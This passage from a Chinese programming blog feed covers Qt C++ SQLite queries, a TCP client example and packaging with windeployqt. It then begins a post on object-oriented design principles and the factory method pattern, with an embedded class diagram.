</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">QCoreApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;Available drivers:&quot;</span>;</span><br><span class="line">    QStringList drivers = QSqlDatabase::<span class="built_in">drivers</span>();</span><br><span class="line">    foreach(QString driver, drivers)</span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; driver;</span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="简单数据库应用"><a href="#简单数据库应用" class="headerlink" title="简单数据库应用"></a>简单数据库应用</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QCoreApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QSqlQuery&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="function">QCoreApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="comment">//创建一个SQLite数据库连接</span></span><br><span class="line">    QSqlDatabase db = QSqlDatabase::<span class="built_in">addDatabase</span>(<span class="string">&quot;QSQLITE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//数据库连接命名</span></span><br><span class="line">    db.<span class="built_in">setDatabaseName</span>(<span class="string">&quot;:memory:&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打开数据库</span></span><br><span class="line">    <span class="keyword">if</span>(!db.<span class="built_in">open</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//以下执行相关sql语句</span></span><br><span class="line">    <span class="function">QSqlQuery <span class="title">query</span><span class="params">(db)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新建student表，id设置为主键，还有一个name项</span></span><br><span class="line">    query.<span class="built_in">exec</span>(<span class="string">&quot;create table student(id int primary key,name varchar)&quot;</span>);</span><br><span class="line">    <span class="comment">//向表中插入3条记录</span></span><br><span class="line">    query.<span class="built_in">exec</span>(<span class="string">&quot;insert into student values(1,&#x27;xiaogang&#x27;)&quot;</span>);</span><br><span class="line">    query.<span class="built_in">exec</span>(<span class="string">&quot;insert into student values(2,&#x27;xiaoming&#x27;)&quot;</span>);</span><br><span class="line">    query.<span class="built_in">exec</span>(<span class="string">&quot;insert into student values(3,&#x27;xiaohong&#x27;)&quot;</span>);</span><br><span class="line">    <span class="comment">//查找表中id &gt;=2 的记录的id项和name项的值</span></span><br><span class="line">    query.<span class="built_in">exec</span>(<span class="string">&quot;select id,name from student where id &gt;= 2&quot;</span>);</span><br><span class="line">    <span class="comment">//query.next()指向查找到的第一条记录，然后每次后移一条记录</span></span><br><span class="line">    <span class="keyword">while</span>(query.<span class="built_in">next</span>()) &#123;</span><br><span class="line">        <span class="comment">//query.value(0)是id的值，将其转换为int型</span></span><br><span class="line">        <span class="type">int</span> value0 = query.<span class="built_in">value</span>(<span class="number">0</span>).<span class="built_in">toInt</span>();</span><br><span class="line">        QString value1 = query.<span class="built_in">value</span>(<span class="number">1</span>).<span class="built_in">toString</span>();</span><br><span class="line">        <span class="comment">//输出两个值</span></span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; value0 &lt;&lt; value1 ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="QSqlQuery"><a href="#QSqlQuery" class="headerlink" title="QSqlQuery"></a>QSqlQuery</h3><h4 id="初始化连接数据库"><a href="#初始化连接数据库" class="headerlink" title="初始化连接数据库"></a>初始化连接数据库</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个SQLite数据库连接</span></span><br><span class="line">QSqlDatabase db = QSqlDatabase::<span class="built_in">addDatabase</span>(<span class="string">&quot;QSQLITE&quot;</span>);</span><br><span class="line"><span class="comment">//数据库连接命名</span></span><br><span class="line">db.<span class="built_in">setDatabaseName</span>(<span class="string">&quot;wangyubo.db&quot;</span>);</span><br><span class="line"><span class="comment">//打开数据库</span></span><br><span class="line"><span class="keyword">if</span>(!db.<span class="built_in">open</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">QSqlQuery <span class="title">sqlQuery</span><span class="params">(db)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="执行一条语句并打印错误信息"><a href="#执行一条语句并打印错误信息" class="headerlink" title="执行一条语句并打印错误信息"></a>执行一条语句并打印错误信息</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">QSqlQuery <span class="title">sqlQuery</span><span class="params">(db)</span></span>;</span><br><span class="line"><span class="type">bool</span> result = sqlQuery.<span class="built_in">exec</span>(<span class="string">&quot;CREATE TABLE IF NOT EXISTS Account (&quot;</span></span><br><span class="line">                            <span class="string">&quot;id TEXT PRIMARY KEY UNIQUE, &quot;</span></span><br><span class="line">                            <span class="string">&quot;username TEXT, &quot;</span></span><br><span class="line">                            <span class="string">&quot;password TEXT, &quot;</span></span><br><span class="line">                            <span class="string">&quot;nickname TEXT, &quot;</span></span><br><span class="line">                            <span class="string">&quot;lastLoginTime INTEGER, &quot;</span></span><br><span class="line">                            <span class="string">&quot;createTime INTEGER, &quot;</span></span><br><span class="line">                            <span class="string">&quot;configs TEXT)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!result) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Create table Account failed, code %d, %s&quot;</span>, sqlQuery.<span class="built_in">lastError</span>().<span class="built_in">type</span>(), sqlQuery.<span class="built_in">lastError</span>().<span class="built_in">text</span>().<span class="built_in">toLatin1</span>().<span class="built_in">data</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">LOG_INFO</span>(<span class="string">&quot;Create table Account success&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="获取查询的结果"><a href="#获取查询的结果" class="headerlink" title="获取查询的结果"></a>获取查询的结果</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">QSqlQuery <span class="title">sqlQuery</span><span class="params">(db)</span></span>;</span><br><span class="line"><span class="type">bool</span> result = sqlQuery.<span class="built_in">exec</span>(<span class="string">&quot;SELECT * FROM TM_Account&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!result) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Query failed, code %d, %s&quot;</span>, sqlQuery.<span class="built_in">lastError</span>().<span class="built_in">type</span>(), sqlQuery.<span class="built_in">lastError</span>().<span class="built_in">text</span>().<span class="built_in">toLatin1</span>().<span class="built_in">data</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果有几个条目（列数）</span></span><br><span class="line"><span class="type">int</span> itemSize = sqlQuery.<span class="built_in">record</span>().<span class="built_in">count</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历结果</span></span><br><span class="line"><span class="keyword">while</span> (sqlQuery.<span class="built_in">next</span>()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; itemSize; ++i) &#123;</span><br><span class="line">        <span class="comment">//int</span></span><br><span class="line">        <span class="type">int</span> resultInt = sqlQuery.<span class="built_in">value</span>(i).<span class="built_in">toInt</span>();</span><br><span class="line">        <span class="comment">//QString</span></span><br><span class="line">        QString resultStr = sqlQuery.<span class="built_in">value</span>(i).<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//特定结果</span></span><br><span class="line">QString resultStr = sqlQuery.<span class="built_in">value</span>(<span class="string">&quot;username&quot;</span>).<span class="built_in">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果所在的条目序号，从0开始</span></span><br><span class="line"><span class="type">int</span> index = sqlQuery.<span class="built_in">at</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//转到第一条记录</span></span><br><span class="line">sqlQuery.<span class="built_in">first</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//转到最后一条记录</span></span><br><span class="line">sqlQuery.<span class="built_in">last</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//转到下一条记录</span></span><br><span class="line">sqlQuery.<span class="built_in">next</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//总条数（行数）</span></span><br><span class="line">sqlQuery.<span class="built_in">last</span>();</span><br><span class="line"><span class="type">int</span> count = sqlQuery.<span class="built_in">at</span>() + <span class="number">1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="网络相关接口"><a href="#网络相关接口" class="headerlink" title="网络相关接口"></a>网络相关接口</h2><h3 id="TCP客户端-服务器"><a href="#TCP客户端-服务器" class="headerlink" title="TCP客户端&#x2F;服务器"></a>TCP客户端&#x2F;服务器</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>需要在工程文件<code>.pro</code>中添加<code>QT += network</code>才能看到<code>QTcpSocket</code>头文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//h</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QTcpSocket&gt;</span></span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainWindow</span> : <span class="keyword">public</span> QMainWindow</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MainWindow</span><span class="params">(QWidget *parent = <span class="number">0</span>)</span></span>;</span><br><span class="line">    ~<span class="built_in">MainWindow</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> slots:</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">tcpClientDisconnected</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">tcpClientReceiveData</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * @description 初始化TcpSocket</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">initTcpSocket</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * @description tcp客户端连接</span></span><br><span class="line"><span class="comment">     * @return 0，成功；其他，错误码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">tcpClientConnect</span><span class="params">()</span></span>;</span><br><span class="line">    ......</span><br><span class="line">    std::shared_ptr&lt;QTcpSocket&gt; m_pTcpSocket = <span class="literal">nullptr</span>;         <span class="comment">//tcp客户端连接指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//cpp</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">//收到数据的处理函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindows::tcpClientReceiveData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    QByteArray buffer = m_pTcpSocket-&gt;<span class="built_in">readAll</span>();</span><br><span class="line">    <span class="built_in">LOG_HEX</span>(buffer.<span class="built_in">data</span>(), buffer.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tcp断开连接的处理函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindows::tcpClientDisconnected</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;TcpClient disconnected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化tcp连接</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindows::initTcpSocket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//实例化tcpSocket</span></span><br><span class="line">    m_pTcpSocket = std::<span class="built_in">make_shared</span>&lt;QTcpSocket&gt;();</span><br><span class="line">    <span class="comment">//连接信号量</span></span><br><span class="line">    <span class="comment">//断开连接信号</span></span><br><span class="line">    QObject::<span class="built_in">connect</span>(m_pTcpSocket.<span class="built_in">get</span>(), <span class="built_in">SIGNAL</span>(<span class="built_in">disconnected</span>()), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">tcpClientDisconnected</span>()));</span><br><span class="line">    <span class="comment">//收到数据信号</span></span><br><span class="line">    QObject::<span class="built_in">connect</span>(m_pTcpSocket.<span class="built_in">get</span>(), <span class="built_in">SIGNAL</span>(<span class="built_in">readyRead</span>()), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">tcpClientReceiveData</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接tcp</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindows::tcpClientConnect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    QString host = <span class="string">&quot;Githubwyb.github.io&quot;</span>;</span><br><span class="line">    <span class="type">int</span> port = <span class="number">8080</span>;</span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Connect to %s:%d&quot;</span>, host.<span class="built_in">toLatin1</span>().<span class="built_in">data</span>(), port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//断开以前的连接</span></span><br><span class="line">    m_pTcpSocket-&gt;<span class="built_in">abort</span>();</span><br><span class="line">    <span class="comment">//连接服务器</span></span><br><span class="line">    m_pTcpSocket-&gt;<span class="built_in">connectToHost</span>(host, port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待五秒连接</span></span><br><span class="line">    <span class="keyword">if</span> (!m_pTcpSocket-&gt;<span class="built_in">waitForConnected</span>(<span class="number">5000</span>)) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Connect error&quot;</span>);</span><br><span class="line">        QMessageBox::<span class="built_in">critical</span>(<span class="keyword">this</span>, <span class="string">&quot;Connect error&quot;</span>, <span class="built_in">QString</span>(<span class="string">&quot;Can&#x27;t connect to %1:%2&quot;</span>).<span class="built_in">arg</span>(host).<span class="built_in">arg</span>(port));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Connect success&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="widgets-application"><a href="#widgets-application" class="headerlink" title="widgets application"></a>widgets application</h1><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>尝试着把自己写的工程程序给打包发布出来，在任何一台windows系统都能运行，这样就不会限于电脑需不需要安装QT安装包了。<br>使用QT5自带的windeployqt</p>
<ol>
<li>打开一个QT程序，以release方式运行一次。</li>
<li>这时你的工程项目文件夹下，会生成一个关于release的文件夹。</li>
<li>打开关于release相关的文件夹，找到该目录下release目录下的.exe程序。此时你点击是运行不成功的。因为缺少QT必要的库文件。将这个.exe文件拷贝出来，创建一个单独的文件夹，放在这个文件夹下。</li>
<li>打开命令行，定位到上一步的文件夹中，使用qt安装目录的windeployqt+程序名进行打包。我的执行命令如下：<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">ProgramData</span>\<span class="title">Qt</span>\<span class="title">Qt5</span>.10.1\5.10.1\<span class="title">mingw53_32</span>\<span class="title">bin</span>\<span class="title">windeployqt.exe</span> .\<span class="title">test.exe</span></span></span><br></pre></td></tr></table></figure></li>
<li>打开程序，根据弹出的缺少的dll，从bin目录下拷贝过去即可。</li>
</ol>
<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="debug成功，release闪退"><a href="#debug成功，release闪退" class="headerlink" title="debug成功，release闪退"></a>debug成功，release闪退</h2><ol>
<li>一个原因是因为debug版本和release版本切换后需要清理一下工程，重新编译才行</li>
</ol>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>面向对象学习笔记</title>
    <url>/blogs/2018-10-09-objectOrientedStudy/</url>
    <content><![CDATA[<h1 id="一、面向对象基本概念"><a href="#一、面向对象基本概念" class="headerlink" title="一、面向对象基本概念"></a>一、面向对象基本概念</h1><ol>
<li>三大特性：封装-继承-多态</li>
<li>一些相关的重要概念：抽象-组合-动态绑定-消息传递</li>
</ol>
<h2 id="1-类之间的关系"><a href="#1-类之间的关系" class="headerlink" title="1. 类之间的关系"></a>1. 类之间的关系</h2><h3 id="1-1-组合"><a href="#1-1-组合" class="headerlink" title="1.1. 组合"></a>1.1. 组合</h3><ul>
<li>整体拥有部件，部件生命周期跟随整体</li>
<li>部件仅能被一个整体拥有</li>
</ul>
<h3 id="1-2-聚合"><a href="#1-2-聚合" class="headerlink" title="1.2. 聚合"></a>1.2. 聚合</h3><ul>
<li>整体拥有部件，但是部件生命周期不随整体</li>
<li>部件可以被多个整体拥有</li>
</ul>
<h1 id="二、设计模式"><a href="#二、设计模式" class="headerlink" title="二、设计模式"></a>二、设计模式</h1><p>由面向对象基本特性得来的设计模式包括三类23种，如下所示：</p>
<h2 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h2><ol>
<li>OCP-开放封闭原则: 模块本身实现是封闭的，变化通过扩展进行而不是修改内部逻辑</li>
<li>LSP-里氏代换原则: 子类可以完全替换父类</li>
<li>DIP-依赖倒转原则: 抽象不应依赖细节，细节应依赖抽象（面向接口）</li>
<li>ISP-接口隔离原则: 一个类对另外一个类的依赖应当建立在最小的接口上</li>
<li>CARP-合成&#x2F;聚合复用原则: 尽量使用合成&#x2F;聚合，尽量不要使用继承（因继承是强偶合）</li>
<li>LoD-迪米特法则: 若两个类不必直接通信，则不应直接交互。成员该私有要私有</li>
<li>SRP-单一职责原则: 就一个类而言，应该仅有一个引起它变化的原因</li>
<li>封装变化点，分析需求上的易变点和不变点，将易变的封装成类</li>
</ol>
<h2 id="A．创建型模式"><a href="#A．创建型模式" class="headerlink" title="A．创建型模式"></a>A．创建型模式</h2><h3 id="1-工厂方法模式（虚拟构造子模式-多态性工厂模式）"><a href="#1-工厂方法模式（虚拟构造子模式-多态性工厂模式）" class="headerlink" title="1. 工厂方法模式（虚拟构造子模式&#x2F;多态性工厂模式）"></a>1. 工厂方法模式（虚拟构造子模式&#x2F;多态性工厂模式）</h3><img src="2020-07-18-01.png"/>
定义一个创建实例对象的工厂接口，将实际创建工作推迟到子类中。

<p><strong>适用场景</strong></p>
<ol>
<li>如果一个类的构造函数比较复杂，需要进行各种判断和查询等，建议使用工厂模式，将类的构造变简单可拓展</li>
<li>如果期望类的实现未来变化，将使用新的类进行替换，可以使用工厂模式，后续直接使用v2替换工厂里面的new，一般接口和实现分离的库使用工厂模式</li>
<li>如果一个抽象类有多种实现，各种实现仅对外提供一个抽象接口类，可以使用工厂根据不同的类型返回不同的子类实现</li>
<li>类似下面结构</li>
</ol>
<?xml version="1.0" encoding="us-ascii" standalone="no"?><svg  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentStyleType="text/css" height="364px" preserveAspectRatio="none" style="width:249px;height:364px;background:#FFFFFF;" version="1.1" viewBox="0 0 249 364" width="249px" zoomAndPan="magnify" class="kroki">$2<defs/><g><text fill="#000000" font-family="sans-serif" font-size="14" font-weight="bold" lengthAdjust="spacing" textLength="28" x="103.5" y="22.9951">&#31867;&#22270;</text><!--class ITest--><g id="elem_ITest"><rect codeLine="3" fill="#F1F1F1" height="64.2969" id="ITest" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="100" x="74" y="44.2969"/><ellipse cx="104.3" cy="60.2969" fill="#B4A7E5" rx="11" ry="11" style="stroke:#181818;stroke-width:1.0;"/><path d="M100.2219,56.0625 L100.2219,53.9063 L107.6125,53.9063 L107.6125,56.0625 L105.1438,56.0625 L105.1438,64.1406 L107.6125,64.1406 L107.6125,66.2969 L100.2219,66.2969 L100.2219,64.1406 L102.6906,64.1406 L102.6906,56.0625 L100.2219,56.0625 Z " fill="#000000"/><text fill="#000000" font-family="sans-serif" font-size="14" font-style="italic" lengthAdjust="spacing" textLength="34" x="121.7" y="65.1436">ITest</text><line style="stroke:#181818;stroke-width:0.5;" x1="75" x2="173" y1="76.2969" y2="76.2969"/><line style="stroke:#181818;stroke-width:0.5;" x1="75" x2="173" y1="84.2969" y2="84.2969"/><ellipse cx="85" cy="97.9453" fill="#84BE84" rx="3" ry="3" style="stroke:#038048;stroke-width:1.0;"/><text fill="#000000" font-family="sans-serif" font-size="14" font-style="italic" lengthAdjust="spacing" textLength="74" x="94" y="101.292">test(): void</text></g><!--class testImpl1--><g id="elem_testImpl1"><rect codeLine="7" fill="#F1F1F1" height="64.2969" id="testImpl1" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="100" x="142" y="168.5969"/><ellipse cx="158.8" cy="184.5969" fill="#ADD1B2" rx="11" ry="11" style="stroke:#181818;stroke-width:1.0;"/><path d="M161.7688,190.2375 Q161.1906,190.5344 160.55,190.675 Q159.9094,190.8312 159.2063,190.8312 Q156.7063,190.8312 155.3781,189.1906 Q154.0656,187.5344 154.0656,184.4094 Q154.0656,181.2844 155.3781,179.6281 Q156.7063,177.9719 159.2063,177.9719 Q159.9094,177.9719 160.55,178.1281 Q161.2063,178.2844 161.7688,178.5812 L161.7688,181.3 Q161.1438,180.7219 160.55,180.4562 Q159.9563,180.175 159.3313,180.175 Q157.9875,180.175 157.3,181.2531 Q156.6125,182.3156 156.6125,184.4094 Q156.6125,186.5031 157.3,187.5812 Q157.9875,188.6437 159.3313,188.6437 Q159.9563,188.6437 160.55,188.3781 Q161.1438,188.0969 161.7688,187.5187 L161.7688,190.2375 Z " fill="#000000"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="64" x="173.2" y="189.4436">testImpl1</text><line style="stroke:#181818;stroke-width:0.5;" x1="143" x2="241" y1="200.5969" y2="200.5969"/><line style="stroke:#181818;stroke-width:0.5;" x1="143" x2="241" y1="208.5969" y2="208.5969"/><ellipse cx="153" cy="222.2453" fill="#84BE84" rx="3" ry="3" style="stroke:#038048;stroke-width:1.0;"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="74" x="162" y="225.592">test(): void</text></g><!--class testImpl2--><g id="elem_testImpl2"><rect codeLine="11" fill="#F1F1F1" height="64.2969" id="testImpl2" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="100" x="7" y="168.5969"/><ellipse cx="23.8" cy="184.5969" fill="#ADD1B2" rx="11" ry="11" style="stroke:#181818;stroke-width:1.0;"/><path d="M26.7688,190.2375 Q26.1906,190.5344 25.55,190.675 Q24.9094,190.8312 24.2063,190.8312 Q21.7063,190.8312 20.3781,189.1906 Q19.0656,187.5344 19.0656,184.4094 Q19.0656,181.2844 20.3781,179.6281 Q21.7063,177.9719 24.2063,177.9719 Q24.9094,177.9719 25.55,178.1281 Q26.2063,178.2844 26.7688,178.5812 L26.7688,181.3 Q26.1438,180.7219 25.55,180.4562 Q24.9563,180.175 24.3313,180.175 Q22.9875,180.175 22.3,181.2531 Q21.6125,182.3156 21.6125,184.4094 Q21.6125,186.5031 22.3,187.5812 Q22.9875,188.6437 24.3313,188.6437 Q24.9563,188.6437 25.55,188.3781 Q26.1438,188.0969 26.7688,187.5187 L26.7688,190.2375 Z " fill="#000000"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="64" x="38.2" y="189.4436">testImpl2</text><line style="stroke:#181818;stroke-width:0.5;" x1="8" x2="106" y1="200.5969" y2="200.5969"/><line style="stroke:#181818;stroke-width:0.5;" x1="8" x2="106" y1="208.5969" y2="208.5969"/><ellipse cx="18" cy="222.2453" fill="#84BE84" rx="3" ry="3" style="stroke:#038048;stroke-width:1.0;"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="74" x="27" y="225.592">test(): void</text></g><!--class testFactory--><g id="elem_testFactory"><rect codeLine="15" fill="#F1F1F1" height="64.2969" id="testFactory" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="123" x="62.5" y="292.8869"/><ellipse cx="83.8" cy="308.8869" fill="#ADD1B2" rx="11" ry="11" style="stroke:#181818;stroke-width:1.0;"/><path d="M86.7688,314.5275 Q86.1906,314.8244 85.55,314.965 Q84.9094,315.1213 84.2063,315.1213 Q81.7063,315.1213 80.3781,313.4806 Q79.0656,311.8244 79.0656,308.6994 Q79.0656,305.5744 80.3781,303.9181 Q81.7063,302.2619 84.2063,302.2619 Q84.9094,302.2619 85.55,302.4181 Q86.2063,302.5744 86.7688,302.8713 L86.7688,305.59 Q86.1438,305.0119 85.55,304.7463 Q84.9563,304.465 84.3313,304.465 Q82.9875,304.465 82.3,305.5431 Q81.6125,306.6056 81.6125,308.6994 Q81.6125,310.7931 82.3,311.8713 Q82.9875,312.9338 84.3313,312.9338 Q84.9563,312.9338 85.55,312.6681 Q86.1438,312.3869 86.7688,311.8088 L86.7688,314.5275 Z " fill="#000000"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="77" x="99.2" y="313.7336">testFactory</text><line style="stroke:#181818;stroke-width:0.5;" x1="63.5" x2="184.5" y1="324.8869" y2="324.8869"/><line style="stroke:#181818;stroke-width:0.5;" x1="63.5" x2="184.5" y1="332.8869" y2="332.8869"/><ellipse cx="73.5" cy="346.5353" fill="#84BE84" rx="3" ry="3" style="stroke:#038048;stroke-width:1.0;"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" text-decoration="underline" textLength="97" x="82.5" y="349.882">create(): ITest</text></g><!--reverse link ITest to testImpl1--><g id="link_ITest_testImpl1"><path d="M150.2552,124.6697 C160.4052,142.9297 164.41,150.1169 174.55,168.3569 " fill="none" id="ITest-backto-testImpl1" style="stroke:#181818;stroke-width:1.0;"/><polygon fill="none" points="141.51,108.9369,145.011,127.5848,155.4995,121.7546,141.51,108.9369" style="stroke:#181818;stroke-width:1.0;"/></g><!--reverse link ITest to testImpl2--><g id="link_ITest_testImpl2"><path d="M98.0974,124.7208 C88.0874,142.9808 84.19,150.1169 74.2,168.3569 " fill="none" id="ITest-backto-testImpl2" style="stroke:#181818;stroke-width:1.0;"/><polygon fill="none" points="106.75,108.9369,92.8361,121.8366,103.3587,127.605,106.75,108.9369" style="stroke:#181818;stroke-width:1.0;"/></g><!--reverse link testImpl1 to testFactory--><g id="link_testImpl1_testFactory"><path codeLine="19" d="M171.5749,238.4811 C161.4249,256.7411 151.59,274.4069 141.45,292.6469 " fill="none" id="testImpl1-backto-testFactory" style="stroke:#181818;stroke-width:1.0;stroke-dasharray:7.0,7.0;"/><polygon fill="#181818" points="174.49,233.2369,166.6212,239.1599,172.0608,237.6071,173.6136,243.0467,174.49,233.2369" style="stroke:#181818;stroke-width:1.0;"/></g><!--reverse link testImpl2 to testFactory--><g id="link_testImpl2_testFactory"><path codeLine="20" d="M77.1342,238.4982 C87.1442,256.7582 96.81,274.4069 106.8,292.6469 " fill="none" id="testImpl2-backto-testFactory" style="stroke:#181818;stroke-width:1.0;stroke-dasharray:7.0,7.0;"/><polygon fill="#181818" points="74.25,233.2369,75.0688,243.0516,76.6535,237.6213,82.0839,239.206,74.25,233.2369" style="stroke:#181818;stroke-width:1.0;"/></g><!--SRC=[AyaioKbLUBvnzzFP-xYuClDAKelI4fDJ5Jn3KejB5Agv5810Mw4wCQcuf2WnkQHMeGGehg5ffL2Mdvd2LSl5bPoJM5mC5lNCBSWnL4YjA4dDIob6Cm2_BYEITRa1tP9VL8bmO759OabcSgr2Sb5gOaagI1FOA90kPFLwfGLwTWZNuf4p0W00]--></g></svg>

